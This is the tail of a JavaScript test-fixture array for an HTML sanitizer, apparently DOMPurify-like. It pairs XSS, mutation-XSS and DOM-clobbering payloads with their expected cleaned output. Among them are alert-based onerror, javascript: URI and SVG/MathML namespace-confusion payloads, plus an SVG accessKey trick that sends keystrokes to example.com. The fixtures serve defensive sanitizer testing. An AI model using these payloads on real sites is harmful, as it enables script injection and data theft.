      '<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">\n<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>\n<handler id="y">alert(127)</handler>\n</svg>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">\n\nalert(127)\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">\n\n\n</svg>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * SVG style 中畸形 img 自闭合；
   * 候选容纳图片位于 HTML 或 SVG 修复结构，但都无 handler，检查外来 raw-text 边界。
   */
  {
    'payload':
      '<div id="128"><svg><style><img/src=x onerror=alert(128)// </b>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="128"><svg><style></style></svg><img src="x">//["\'`--&gt;]]&gt;]</div>',
      '<div id="128"><svg><style><img src="x">//["\'`--&gt;]]&gt;]</img></style></svg></div>',
      '<div id="128"><svg><style><img src="x"></style></svg></div>'
    ]
  },
  /**
   * image style 的滤镜 URL 内嵌带 script 的 SVG data URI；
   * 候选保留/转义 CSS 或删 style，检查 DOM 样式边界，未递归净化 URI 文档。
   */
  {
    'title': 'Inline SVG (data-uri)',
    'payload':
      '<div id="129"><svg><image style=\'filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")\'>\n<!--\nSame effect with\n<image filter=\'...\'>\n-->\n</svg>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="129"><svg><image style="filter:url(&quot;data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22&gt;&lt;script&gt;parent.alert(129)&lt;/script&gt;&lt;/svg&gt;&quot;)">\n\n</image></svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="129"><svg><image style="filter:url(&quot;data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>&quot;)">\n\n</image></svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="129"><svg><image>\n\n</image></svg>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * MathML href 与 maction xlink 使用 javascript；
   * 候选删 URI/maction，容纳其普通文字提升或裁剪，检查外来 URI 与标签过滤。
   */
  {
    'title': 'MathML',
    'payload':
      '<div id="130"><math href="javascript:alert(130)">CLICKME</math>\n<math>\n<!-- up to FF 13 -->\n<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>\n\n<!-- FF 14+ -->\n<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>\n</math>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="130"><math>CLICKME</math>\n<math>\n\n\n\n\n\n</math>//["\'`--&gt;]]&gt;]</div>',
      '<div id="130"><math>CLICKME</math>\n<math>\n\nCLICKME\n\n\nCLICKME<mtext>http://http://google.com</mtext>\n</math>//["\'`--&gt;]]&gt;]</div>',
      '<div id="130"><math>CLICKME</math>\n//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * 表单安全密码框与四个 accessKey SVG set；
   * 候选保留表单/图片、删除 set，仅容纳属性顺序，检查动态 SVG 载体拒绝。
   */
  {
    'payload':
      '<div id="132"><!doctype html>\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name="secret" type="password">\n</form>\n<!-- injection --><svg height="50px">\n<image xmlns:xlink="http://www.w3.org/1999/xlink">\n<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />\n<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />\n<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />\n<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />\n</image>\n</svg>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="132">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input type="password" name="secret">\n</form>\n<svg height="50px">\n<image xmlns:xlink="http://www.w3.org/1999/xlink">\n\n\n\n\n</image>\n</svg>//["\'`--&gt;]]&gt;]</div>',
      '<div id="132">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name="secret" type="password">\n</form>\n<svg height="50px">\n<image xmlns:xlink="http://www.w3.org/1999/xlink">\n\n\n\n\n</image>\n</svg>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * 畸形注释内放 img/onerror 文字；
   * 期望注释整体消失，检查注释内容不提升成标记。
   */
  {
    'payload':
      '<div id="133"><!-- `<img/src=xxx onerror=alert(133)//--!>//["\'`-->]]>]</div>',
    'expected': '<div id="133">//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * xmp、ERB 样式文本、img alt 和 script/style 边界交错；
   * 候选删活动脚本但可留 alt 中惰性事件字样，记录 raw-text 与属性序列化差异。
   */
  {
    'title': 'XMP',
    'payload':
      "<div id=\"134\"><xmp>\n<%\n</xmp>\n<img alt='%></xmp><img src=xx onerror=alert(134)//'>\n\n<script>\nx='<%'\n</script> %>/\nalert(2)\n</script>\n\nXXX\n<style>\n*['<!--']{}\n</style>\n-->{}\n*{color:red}</style>//[\"'`-->]]>]</div>",
    'expected': [
      '<div id="134">\n<img alt="%></xmp><img src=xx onerror=alert(134)//">\n\n %&gt;/\nalert(2)\n\n\nXXX\n<style>\n*[\'<!--\']{}\n</style>\n--&gt;{}\n*{color:red}//["\'`--&gt;]]&gt;]</div>',
      '<div id="134">\n<img alt="%&gt;&lt;/xmp&gt;&lt;img src=xx onerror=alert(134)//">\n\n %&gt;/\nalert(2)\n\n\nXXX\n<style>\n*[\'<!--\']{}\n</style>\n-&gt;{}\n*{color:red}//["\'`--&gt;]]&gt;]</div>',
      '<div id="134">\n<img alt="%></xmp><img src=xx onerror=alert(134)//">\n\n %&gt;/\nalert(2)\n\n\nXXX\n\n--&gt;{}\n*{color:red}//["\'`--&gt;]]&gt;]</div>',
      '<div id="134">\n<img alt="%&gt;&lt;/xmp&gt;&lt;img src=xx onerror=alert(134)//">\n\n %&gt;/\nalert(2)\n\n\nXXX\n\n--&gt;{}\n*{color:red}//["\'`--&gt;]]&gt;]</div>',
      '<div id="134">\n<img>\n\n %&gt;/\nalert(2)\n\n\nXXX\n\n--&gt;{}\n*{color:red}//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * 旧 XSL stylesheet 的 eval/if 通过 PI 关联；
   * 候选删转换载体，可留 template 中普通源码文本，检查默认 HTML 标签过滤，不执行 XSL。
   */
  {
    'title': 'SVG',
    'payload':
      '<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>\n<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">\n<template match="/">\n<eval>new ActiveXObject(\'htmlfile\').parentWindow.alert(135)</eval>\n<if expr="new ActiveXObject(\'htmlfile\').parentWindow.alert(2)"></if>\n</template>\n</stylesheet>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="135">\n\n<template>\n\n\n</template>\n//["\'`--&gt;]]&gt;]</div>',
      '<div id="135">\n\n<template>\nnew ActiveXObject(\'htmlfile\').parentWindow.alert(135)\n\n</template>\n//["\'`--&gt;]]&gt;]</div>',
      '<div id="135">\n\n<template>\nnew ActiveXObject(\'htmlfile\').parentWindow.alert(135)\n<head></head><body></body>\n</template>\n//["\'`--&gt;]]&gt;]</div>',
      '<div id="135">\n\n\n//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * 提交表单里 input dirname 指向 password；
   * 期望保留安全 name/value/type，删除 dirname，检查额外表单提交属性准入。
   */
  {
    'payload':
      '<div id="136"><form action="x" method="post">\n<input name="username" value="admin" />\n<input name="password" type="password" value="secret" />\n<input name="injected" value="injected" dirname="password" />\n<input type="submit">\n</form>//["\'`-->]]>]</div>',
    'expected': [
      '<div id="136"><form action="x" method="post">\n<input name="username" value="admin">\n<input name="password" type="password" value="secret">\n<input name="injected" value="injected">\n<input type="submit">\n</form>//["\'`--&gt;]]&gt;]</div>',
      '<div id="136"><form action="x" method="post">\n<input name="username" value="admin">\n<input name="password" type="password" value="secret">\n<input name="injected" value="injected">\n<input type="submit">\n</form>//["\'`--&gt;]]&gt;]</div>'
    ]
  },
  /**
   * SVG animate 尝试把安全 xlink:href 改成 javascript；
   * 期望链接/circle 留存、animate 删除，检查动画载体拒绝。
   */
  {
    'title': 'SVG',
    'payload':
      '<div id="137"><svg>\n<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">\n<circle r="400"></circle>\n<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />\n</a>//["\'`-->]]>]</div>',
    'expected':
      '<div id="137"><svg>\n<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">\n<circle r="400"></circle>\n\n</a>//["\'`--&gt;]]&gt;]</svg></div>'
  },
  /**
   * input 名称 submit；
   * 期望只剩 input 和文字，检查 form 成员碰撞。
   */
  {
    'title': 'DOM clobbering: submit',
    'payload': '<input name=submit>123',
    'expected': '<input>123'
  },
  /**
   * input 名称 acceptCharset；
   * 期望删除 name，检查命名属性碰撞。
   */
  {
    'title': 'DOM clobbering: acceptCharset',
    'payload': '<input name=acceptCharset>123',
    'expected': '<input>123'
  },
  /**
   * form 内控件名 hasChildNodes；
   * 期望安全 form/input 无 name，检查遍历方法碰撞。
   */
  {
    'title': 'DOM clobbering: hasChildNodes',
    'payload': '<form><input name=hasChildNodes>',
    'expected': '<form><input></form>'
  },
  /**
   * img 的 src 与两个 srcset 候选；
   * 完整输出候选仅容纳属性顺序，检查响应式图片属性准入，输入未包含 sizes。
   */
  {
    'title': 'Testing support for sizes and srcset',
    'payload':
      '<img src="small.jpg" srcset="medium.jpg 1000w, large.jpg 2000w">',
    'expected': [
      '<img src="small.jpg" srcset="medium.jpg 1000w, large.jpg 2000w">',
      '<img srcset="medium.jpg 1000w, large.jpg 2000w" src="small.jpg">'
    ]
  },
  /**
   * div 的布尔 inert；
   * 期望空值序列化属性，检查允许名称与 HTML 布尔属性输出。
   */
  {
    'title': 'Testing support for inert',
    'payload': '<div inert></div>',
    'expected': '<div inert=""></div>'
  },
  /**
   * SVG/textarea/title/style 闭合次序交错；
   * 候选为空、裁剪 SVG 或无事件图片，记录 raw-text/外来命名空间解析差异。
   */
  {
    'title': 'Tests against mXSS behavior with SVG in Chrome 77 and alike 1/2',
    'payload':
      '<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>',
    'expected': [
      '',
      '<svg></svg><p></p><textarea>&lt;title&gt;&lt;style&gt;</textarea><img src="x">',
      '<svg></svg>',
      '<svg></svg><p></p><img src="x">',
      '<svg xmlns="http://www.w3.org/2000/svg" />'
    ]
  },
  /**
   * SVG title 中 a id 内夹闭合 title 与 img/onerror 字样；
   * 候选可保留惰性 id 字符串或无事件图片，不能只用事件字样出现判断活动 handler。
   */
  {
    'title': 'Tests against mXSS behavior with SVG in Chrome 77 and alike 2/2',
    'payload':
      '<svg></p><title><a id="</title><img src=x onerror=alert()>"></textarea></svg>',
    'expected': [
      '',
      '<svg></svg><p></p><title>&lt;a id="</title><img src="x">"&gt;',
      '<svg><title><a id="</title><img src=x onerror=alert()>"></a></title></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><title><a id="</title><img src=x onerror=alert()>"></a></title></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><title><a id="</title><img src=x onerror=alert()>"></a></title></title></svg></svg>',
      '<svg><title></title></svg>'
    ]
  },
  /**
   * MathML/textarea/mi/style 交错；
   * 候选为空、MathML 骨架或无事件图片，检查命名空间与 raw-text 修复。
   */
  {
    'title': 'Tests against mXSS behavior with MathML in Chrome 77 and alike',
    'payload':
      '<math></p><textarea><mi><style></textarea><img src=x onerror=alert(1)></mi></math>',
    'expected': [
      '',
      '<math></math><p></p><textarea>&lt;mi&gt;&lt;style&gt;</textarea><img src="x">',
      '<math></math><p></p><img src="x">',
      '<math></math>'
    ]
  },
  /**
   * SVG title 内嵌 template/style，闭合后接危险 img；
   * 候选为裁剪结构、空模板或安全图片，检查模板与外来内容边界。
   */
  {
    'title':
      'Tests against mXSS behavior with SVG Templates in Chrome 77 and alike',
    'payload':
      '<svg></p><title><template><style></title><img src=x onerror=alert(1)>',
    'expected': [
      '',
      '<svg></svg><p></p><title>&lt;template&gt;&lt;style&gt;</title><img src="x">',
      '<svg></svg><p></p><img src="x">',
      '<svg><title><template></template></title></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><title><template></template></title></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><title><template></template></title></title></svg></svg>',
      '<svg><title></title></svg>'
    ]
  },
  /**
   * MathML mtext/template/style 夹在 textarea 中；
   * 候选为空、骨架或无事件图片，检查模板/文本集成点解析差异。
   */
  {
    'title':
      'Tests against mXSS behavior with MathML Templates in Chrome 77 and alike',
    'payload':
      '<math></br><textarea><mtext><template><style></textarea><img src=x onerror=alert(1)>',
    'expected': [
      '',
      '<math></math>',
      '<math></math><br><textarea>&lt;mtext&gt;&lt;template&gt;&lt;style&gt;</textarea><img src="x">',
      '<math></math><br><img src="x">'
    ]
  },
  /**
   * form 控件名 namespaceURI；
   * 候选为空或去名控件，容纳实际成员遮蔽后的整棵表单拒绝。
   */
  {
    'title': 'Fixed an exception coming from missing clobbering protection',
    'payload': '<form><input name=namespaceURI>',
    'expected': ['', '<form><input></form>']
  },
  /**
   * SVG/MathML/title/style 交错使 img 改变解析位置；
   * 候选为裁剪骨架或无事件图片，检查跨命名空间变异输入。
   */
  {
    'title': 'Tests against mXSS behavior with embedded MathML/SVG',
    'payload':
      '<svg></p><math><title><style><img src=x onerror=alert(1)></style></title>',
    'expected': [
      '',
      '<svg></svg>',
      '<svg></svg><p></p><math></math><img src="x">',
      '<svg></svg><p></p><img src="x">',
      '<svg xmlns="http://www.w3.org/2000/svg" />'
    ]
  },
  /**
   * SVG 后 p/style/g title 中夹真实闭合 style 与 img；
   * 候选保留不同 p 布局、安全图片和尾部文字，检查属性与 raw-text 边界。
   */
  {
    'title': 'Tests against attribute-based mXSS behavior 1/3',
    'payload':
      '<svg><p><style><g title="</style><img src=x onerror=alert(1)>">',
    'expected': [
      '<svg></svg><p></p><style><g title="</style><img src="x">"&gt;',
      '<svg></svg><p></p><img src="x">"&gt;',
      '<svg></svg><p><img src="x">"&gt;</p>'
    ]
  },
  /**
   * SVG foreignObject 的 HTML p/style/iframe 边界混淆；
   * 期望只留空 svg，检查默认拒绝 foreignObject 子树。
   */
  {
    'title': 'Tests against attribute-based mXSS behavior 2/3',
    'payload':
      '<svg><foreignobject><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>',
    'expected': '<svg></svg>'
  },
  /**
   * MathML annotation-xml 的 HTML 子树带相同 iframe 边界；
   * 期望空 math，检查拒绝的外来子树。
   */
  {
    'title': 'Tests against attribute-based mXSS behavior 3/3',
    'payload':
      '<math><annotation-xml encoding="text/html"><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>',
    'expected': '<math></math>'
  },
  /**
   * xmp 中嵌 SVG/style 和属性闭合片段；
   * 期望空串，检查默认禁内容阻止删除后再形成标记。
   */
  {
    'title': 'Tests against removal-based mXSS behavior 1/2',
    'payload': "<xmp><svg><b><style><b title='</style><img>'>",
    'expected': ''
  },
  /**
   * noembed 中使用同形 SVG/style 片段；
   * 期望空串，检查 fallback 容器禁内容。
   */
  {
    'title': 'Tests against removal-based mXSS behavior 2/2',
    'payload': "<noembed><svg><b><style><b title='</style><img>'>",
    'expected': ''
  },
  /**
   * form 在 MathML mtext 中交错闭合，并嵌 mglyph/style/img；
   * 期望修复表单骨架、危险分支删除，检查解析后的嵌套 namespace。
   */
  {
    'title': 'Tests against nesting-based mXSS behavior 1/5',
    'payload':
      '<form><math><mtext></form><form><mglyph><style><img src=x onerror=alert(1)>',
    'expected': '<form><math><mtext><form></form></mtext></math></form>'
  },
  /**
   * MathML mtext/table/mglyph/style 内危险 href；
   * 期望仅 math/mtext/table 骨架，检查不安全外来分支裁剪。
   */
  {
    'title': 'Tests against nesting-based mXSS behavior 2/5',
    'payload':
      '<math><mtext><table><mglyph><style><math href=javascript:alert(1)>CLICKME</math>',
    'expected': '<math><mtext><table></table></mtext></math>'
  },
  /**
   * 同一骨架改为注释与 title 实体闭合攻击；
   * 期望危险子树丢弃而留骨架，检查注释/raw-text 变异边界。
   */
  {
    'title': 'Tests against nesting-based mXSS behavior 3/5',
    'payload':
      '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
    'expected': '<math><mtext><table></table></mtext></math>'
  },
  /**
   * form/MathML/mglyph/SVG/style/path id 混合危险图片；
   * 期望只留修复表单与 MathML 骨架，检查跨 namespace 属性边界。
   */
  {
    'title': 'Tests against nesting-based mXSS behavior 4/5',
    'payload':
      '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
    'expected': '<form><math><mtext><form></form></mtext></math></form>'
  },
  /**
   * 以 table 版本混合 MathML/SVG/path id；
   * 候选为空或两种安全骨架，容纳外来树修复差异。
   */
  {
    'title': 'Tests against nesting-based mXSS behavior 5/5',
    'payload':
      '<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
    'expected': [
      '',
      '<math><mtext><table></table></mtext></math>',
      '<math></math>'
    ]
  },
  /**
   * MathML mtext 中 h1/h6/a 被解析器重组，尾部夹外来危险片段；
   * 期望安全标题/链接骨架，检查 HTML integration point 的修复与裁剪。
   */
  {
    'title':
      'Tests against additional problems regarding HTML inside MathML 1/2',
    'payload':
      '<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title="</style><img src onerror=\'alert(1)\'>"></style></h1>',
    'expected': '<math><mtext><h1><a></a><h6><a></a></h6></h1></mtext></math>'
  },
  /**
   * 只有 more soon 注释，没有攻击结构；
   * 期望空串，实际覆盖普通注释删除，标题预告未构成第二个 MathML 场景。
   */
  {
    'title':
      'Tests against additional problems regarding HTML inside MathML 2/2',
    'payload': '<!-- more soon -->',
    'expected': ''
  },
  /**
   * 未知 xss 包装与 SVG desc/noscript 中实体攻击交错；
   * 期望保留 a 文字和空 desc，检查未知包装删除后的 namespace 边界。
   */
  {
    'title':
      'Test against fake-element-based namepsace-confusion abusing mXSS attacks 1/2',
    'payload':
      'a<svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;s>&lt/s>&lt;style>&lt;a title="&lt;/style>&lt;img src onerror=alert(1)>">',
    'expected': 'a<svg><desc></desc></svg>'
  },
  /**
   * 未知 FAKEFAKE 包装夹在 MathML option/mglyph/SVG 链中；
   * 期望 option 骨架、危险分支丢弃，检查假元素提升后的 namespace 规则。
   */
  {
    'title':
      'Test against fake-element-based namepsace-confusion abusing mXSS attacks 2/2',
    'payload':
      "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title=\"</style><img src='#' onerror='alert(1)'>\">",
    'expected': '<math><mtext><option><option></option></option></mtext></math>'
  },
  /**
   * 输入仅一个空格，没有标记；
   * 期望同一空格，检查默认纯文本快速返回保留空白。
   */
  {
    'title': 'Tests against proper handling of leading whitespaces',
    'payload': ' ',
    'expected': ' '
  },
  /**
   * div 包空 math；
   * 期望两层结构保留，检查合法空外来容器。
   */
  {
    'title': 'Tests against proper handling of empty MathML containers',
    'payload': '<div><math></math></div>',
    'expected': '<div><math></math></div>'
  },
  /**
   * b 的 is=foo 未获定制内建权限；
   * 期望 is 空值而非原值，检查字符串返回中的 is 特殊删除处理。
   */
  {
    'title':
      'Tests against proper handling of is attributes (which cannot be removed)',
    'payload': '<b is="foo">bar</b>',
    'expected': '<b is="">bar</b>'
  },
  /**
   * select 内 template.content 装危险 img；
   * 期望模板和 src 保留、事件删除，检查选择控件与模板递归的组合。
   */
  {
    'title': 'Tests against removal of templates inside select elements',
    'payload':
      '<select><template><img src=x onerror=alert(1)></template></select>',
    'expected': '<select><template><img src="x"></template></select>'
  },
  /**
   * header/search 内含合法搜索 form/label/input/button；
   * 期望语义结构与合法关联属性保留，检查 search 默认标签准入。
   */
  {
    'title': 'Testing support for search',
    'payload':
      '<header><h1>Movie website</h1><search><form action="./search/"><label for="movie">Find a Movie</label><input type="search" id="movie" name="q" /><button type="submit">Search</button></form></search></header>',
    'expected':
      '<header><h1>Movie website</h1><search><form action="./search/"><label for="movie">Find a Movie</label><input type="search" id="movie" name="q"><button type="submit">Search</button></form></search></header>'
  },
  /**
   * SVG mask 带 mask-type=alpha 并被 rect 引用；
   * 期望完整安全结构，检查新增 SVG 属性准入。
   */
  {
    'title': "Does not remove the SVG 'mask-type' attribute",
    'payload':
      '<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><mask id="a" mask-type="alpha"><rect width="100%" height="100%" fill="rgb(10% 10% 10% / 0.4)"></rect><circle cx="50" cy="50" r="35" fill="rgb(90% 90% 90% / 0.6)"></circle></mask><rect width="45" height="45" fill="red" mask="url(#a)"></rect></svg>',
    'expected':
      '<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><mask id="a" mask-type="alpha"><rect width="100%" height="100%" fill="rgb(10% 10% 10% / 0.4)"></rect><circle cx="50" cy="50" r="35" fill="rgb(90% 90% 90% / 0.6)"></circle></mask><rect width="45" height="45" fill="red" mask="url(#a)"></rect></svg>'
  },
  /**
   * button 带 command 与 commandfor；
   * 期望两属性及文字保留，检查命令按钮属性集合。
   */
  {
    'title': 'Testing support for command and commandfor',
    'payload':
      '<button command="show-modal" commandfor="dialog">Show Modal</button>',
    'expected':
      '<button command="show-modal" commandfor="dialog">Show Modal</button>'
  },
  /**
   * button 带 popovertarget/action；
   * 期望两属性保留，检查 popover 目标属性准入。
   */
  {
    'title': 'Testing support for popovertarget and popovertargetaction',
    'payload':
      '<button popovertargetaction="show" popovertarget="popover">Show Popover</button>',
    'expected':
      '<button popovertargetaction="show" popovertarget="popover">Show Popover</button>'
  },
  /**
   * 独立 selectedcontent 空元素；
   * 现有标量 expected 写保留形状，但子串匹配也接受默认清洗的空串。
   * 此数据未严格验证默认元素保留。
   */
  {
    'title': 'Testing support for selectedcontent',
    'payload': '<selectedcontent></selectedcontent>',
    'expected': '<selectedcontent></selectedcontent>'
  },
];
